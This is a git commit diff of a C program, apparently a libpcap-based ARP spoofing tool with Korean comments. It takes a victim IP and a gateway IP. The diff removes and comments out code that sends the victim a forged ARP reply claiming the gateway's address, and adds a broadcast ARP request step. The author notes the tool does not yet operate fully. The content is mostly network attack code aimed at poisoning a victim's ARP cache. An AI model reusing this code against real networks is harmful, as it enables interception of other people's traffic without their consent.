2240d72b89b07d685e8851ad426720629cd8cebb
umbum <umbum7601@gmail.com>
2018-07-31 14:54:15 +0900

    Get rid of eth_arp func to control directly + some refactoring. not operate fully

--- main.cpp
+++ main.cpp
@@ -7,7 +7,9 @@
 #include <linux/if_ether.h>
 #include <netinet/ether.h>
 
-#include <sys/socket.h>
+#include <sys/types.h>
+#include <ifaddrs.h>
+#include <netdb.h>
 #include <arpa/inet.h>
 #include <pcap.h>
 
@@ -22,10 +24,17 @@
 #define SYS_NET_PATH      "/sys/class/net/%s/address"
 #define SYS_NET_PATH_LEN  24
 #define PROC_ARP_PATH     "/proc/net/arp"
-#define ARP_TABLE_ENTRY_LEN 128 // interface name max-length : 15.
+#define INT_NAME_MAX_LEN  15
+#define ARP_TABLE_ENTRY_LEN 128
 
-#define ARP_REPLY 2
-#define ARP_REPLY_PACKET_SIZE 60
+#define BROADCAST_ETH_STR   "ff:ff:ff:ff:ff:ff"
+#define ARP_REQ_DST_MAC_STR "00:00:00:00:00:00"
+
+#define ARP_REQUEST 1
+#define ARP_REPLY   2
+ 
+#define NI_MAXHOST 1025
+#define NI_NUMERICHOST 1
 
 
 typedef struct _eth_header {
@@ -57,11 +66,12 @@ void print_mac_addr(const char*, uint8_t (*)[6]);
 void print_packet(u_char* p);
 
 char* get_dev_mac(const char* dev);
+char* get_src_ip_str(const char* dev);
 char* get_hosts_mac(const char* target_ip_str);
 
-int  fill_eth_arp_packet(eth_arp_packet*, const char*, const char*, const char*);
-void fill_eth_header(eth_header*, const char*, const char*);
-void fill_arp_packet(arp_packet*, const char*, const char*, const char*, const char*);
+void fill_eth_header(eth_header*, const char*, const char*, uint16_t);
+void fill_arp_packet(arp_packet*, const char*, const char*, const char*, const char*, uint16_t);
+
 
 
 
@@ -87,11 +97,36 @@ int main(int argc, char* argv[]) {
   }
 
   eth_arp_packet* packet = (eth_arp_packet*)malloc(sizeof(eth_arp_packet));
-  if (fill_eth_arp_packet(packet, dev, gateway_ip_str, victim_ip_str) != 0) {
-    perror("[*] fill_eth_arp_packet error");
-    pcap_close(handle);
+  char* src_mac_str    = get_dev_mac(dev);
+  char* victim_mac_str = get_hosts_mac(victim_ip_str);
+  if ((src_mac_str == NULL) || (victim_mac_str == NULL)) {
+    perror("[*] get_????_mac() error");
     return -1;
-  };
+  }
+
+  /* ***여기서 ether_aton(src_mac_str)을 계산해서 넘기지 않는 이유***
+   ether_aton() 함수는 호출하자마자 결과로 리턴된 주소값을 어딘가에 memcpy()해두어야 한다.
+   다음 ether_aton() 호출 시 바로 덮어 써져서 날아가기 때문.
+   그 외에 string을 넘기면 좀 더 wrapping할 수 있다는 장점도 있다. */
+
+  char* src_ip_str = get_src_ip_str(dev);
+  printf("%s\n", src_ip_str);
+
+  fill_eth_header(&packet->eth, src_mac_str, BROADCAST_ETH_STR, ETH_P_ARP);
+  fill_arp_packet(&packet->arp, src_mac_str, ARP_REQ_DST_MAC_STR, src_ip_str, victim_ip_str, ARP_REQUEST);
+  print_mac_addr("src_mac : ", (uint8_t (*)[6])packet->eth.src_addr);
+  print_mac_addr("dst_mac : ", (uint8_t (*)[6])packet->eth.dst_addr);  
+  print_packet((u_char*)packet);
+  if (pcap_sendpacket(handle, (u_char*)packet, sizeof(eth_arp_packet)) == -1) {
+      fprintf(stderr, "[*] send error : %s\n", pcap_geterr(handle));
+  }
+
+  
+
+  /*
+  fill_eth_header(&packet->eth, src_mac_str, victim_mac_str, ETH_P_ARP);
+  fill_arp_packet(&packet->arp, src_mac_str, victim_mac_str, gateway_ip_str, victim_ip_str, ARP_REPLY);
+  
   print_mac_addr("src_mac : ", (uint8_t (*)[6])packet->eth.src_addr);
   print_mac_addr("dst_mac : ", (uint8_t (*)[6])packet->eth.dst_addr);  
   print_packet((u_char*)packet);
@@ -99,29 +134,72 @@ int main(int argc, char* argv[]) {
   if (pcap_sendpacket(handle, (u_char*)packet, sizeof(eth_arp_packet)) == -1) {
       fprintf(stderr, "[*] send error : %s\n", pcap_geterr(handle));
   }
-  
+  */
+
+  free(src_mac_str);
+  free(victim_mac_str);  
+  free(src_ip_str);
   pcap_close(handle);
   return 0;
 
 }
 
-void print_mac_addr(const char* str, uint8_t (*a)[6]) {
-  printf("%s", str);
-  printf("%02x:%02x:%02x:%02x:%02x:%02x\n", (*a)[0]
-                                          , (*a)[1]
-                                          , (*a)[2]
-                                          , (*a)[3]
-                                          , (*a)[4]
-                                          , (*a)[5]);
+void fill_eth_header(eth_header* eth, const char* src_mac_str, const char* dst_mac_str, uint16_t type) {
+  /** fill Ethernet header : MAC address 
+   * output : (indirect) filled eth_header*
+   * **/
+  memcpy(&eth->src_addr, ether_aton(src_mac_str), MAC_ADDR_LEN);
+  memcpy(&eth->dst_addr, ether_aton(dst_mac_str), MAC_ADDR_LEN);
+  eth->ether_type = htons(type);
 }
 
-void print_packet(u_char* p) {
-  for (int i = 1; i < sizeof(eth_arp_packet); i++) {
-    printf("%02x ", p[i]);
-    if (i % 16 == 0) {
-      printf("\n");
+void fill_arp_packet(arp_packet* arp, const char* src_mac_str, const char* dst_mac_str,
+                      const char* src_ip_str, const char* dst_ip_str, uint16_t opcode) {
+  /** fill ARP pakcet 
+   * output : (indirect) filled arp_packet*
+   * **/
+  arp->hd_type = htons(1);     // Ethernet일 경우 1
+  arp->protocol_type = htons(ETH_P_IP);
+  arp->hd_size = MAC_ADDR_LEN;
+  arp->protocol_size = IP_ADDR_LEN;
+  arp->opcode = htons(opcode);
+  memcpy(&arp->src_mac, ether_aton(src_mac_str), MAC_ADDR_LEN);
+  arp->src_ip = inet_addr(src_ip_str);    // inet_aton()와 struct in_addr을 사용해도 된다.
+  memcpy(&arp->dst_mac, ether_aton(dst_mac_str), MAC_ADDR_LEN);
+  arp->dst_ip = inet_addr(dst_ip_str);
+}
+
+char* get_src_ip_str(const char* dev) {
+    struct ifaddrs *ifaddr, *ifa;
+    int family, s, n;
+    char* host = (char*)malloc(IP_STR_BUF_LEN);
+
+    if (getifaddrs(&ifaddr) == -1) {
+        perror("getifaddrs");
+        exit(EXIT_FAILURE);
     }
-  }
+
+    for (ifa = ifaddr, n = 0; ifa != NULL; ifa = ifa->ifa_next, n++) {
+        if (ifa->ifa_addr == NULL)
+            continue;
+
+        family = ifa->ifa_addr->sa_family;
+
+        if (family == AF_INET) {
+            s = getnameinfo(ifa->ifa_addr, sizeof(struct sockaddr_in),
+                    host, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);
+            if (s != 0) {
+                printf("getnameinfo() failed: %s\n", gai_strerror(s));
+                exit(EXIT_FAILURE);
+            }
+            else if (!strncmp(ifa->ifa_name, dev, INT_NAME_MAX_LEN)) {
+                break;
+            }
+        }
+    }
+    // printf("\t\taddress: %s <%s>\n", ifa->ifa_name, host);
+    freeifaddrs(ifaddr);
+    return host;
 }
 
 char* get_dev_mac(const char* dev) {
@@ -174,53 +252,24 @@ char* get_hosts_mac(const char* target_ip_str) {
 }
 
 
+void print_mac_addr(const char* str, uint8_t (*a)[6]) {
+  printf("%s", str);
+  printf("%02x:%02x:%02x:%02x:%02x:%02x\n", (*a)[0]
+                                          , (*a)[1]
+                                          , (*a)[2]
+                                          , (*a)[3]
+                                          , (*a)[4]
+                                          , (*a)[5]);
+}
 
-int fill_eth_arp_packet(eth_arp_packet* packet, const char* dev, 
-                          const char* gateway_ip_str, const char* victim_ip_str) {
-  /* input  : eth_arp_header pointer, interface string, vimtim ip string
-   * output : (indirect) eth_arp_header is filled. but it's not returned.  */
-  char* src_mac_str    = get_dev_mac(dev);
-  char* victim_mac_str = get_hosts_mac(victim_ip_str);
-  if ((src_mac_str == NULL) || (victim_mac_str == NULL)) {
-    perror("[*] get_????_mac() error");
-    return -1;
+void print_packet(u_char* p) {
+  int i;
+  for (i = 1; i < sizeof(eth_arp_packet); i++) {
+    printf("%02x ", p[i-1]);
+    if (i % 16 == 0) {
+      printf("\n");
+    }
   }
-  
-  /* ***여기서 ether_aton(src_mac_str)을 계산해서 넘기지 않는 이유***
-   ether_aton() 함수는 호출하자마자 결과로 리턴된 주소값을 어딘가에 memcpy()해두어야 한다.
-   다음 ether_aton() 호출 시 바로 덮어 써져서 날아가기 때문.
-   string을 넘기면 1. 좀 더 wrapping할 수 있다는 장점이 있다.
-                  2. memcpy() 추가적으로 두 번 하는 것 보다 ether_aton() 두 번 호출하는게 나을 것 같다.
-  */
-  fill_eth_header(&packet->eth, src_mac_str, victim_mac_str);
-  fill_arp_packet(&packet->arp, src_mac_str, victim_mac_str, gateway_ip_str, victim_ip_str);  
-
-  free(src_mac_str);
-  free(victim_mac_str);
-  return 0;
-}
-
-void fill_eth_header(eth_header* eth, const char* src_mac_str, const char* dst_mac_str) {
-  /** fill Ethernet header : MAC address 
-   * output : (indirect) filled eth_header*
-   * **/
-  memcpy(&eth->src_addr, ether_aton(src_mac_str), MAC_ADDR_LEN);
-  memcpy(&eth->dst_addr, ether_aton(dst_mac_str), MAC_ADDR_LEN);
-  eth->ether_type = htons(ETH_P_ARP);
-}
-
-void fill_arp_packet(arp_packet* arp, const char* src_mac_str, const char* dst_mac_str,
-                      const char* src_ip_str, const char* dst_ip_str) {
-  /** fill ARP pakcet 
-   * output : (indirect) filled arp_packet*
-   * **/
-  arp->hd_type = htons(1);     // Ethernet일 경우 1
-  arp->protocol_type = htons(ETH_P_IP);
-  arp->hd_size = MAC_ADDR_LEN;
-  arp->protocol_size = IP_ADDR_LEN;
-  arp->opcode = htons(ARP_REPLY);
-  memcpy(&arp->src_mac, ether_aton(src_mac_str), MAC_ADDR_LEN);
-  arp->src_ip = inet_addr(src_ip_str);    // inet_aton()와 struct in_addr을 사용해도 된다.
-  memcpy(&arp->dst_mac, ether_aton(dst_mac_str), MAC_ADDR_LEN);
-  arp->dst_ip = inet_addr(dst_ip_str);
+  printf("%02x ", p[i]);
+  printf("\n");
 }
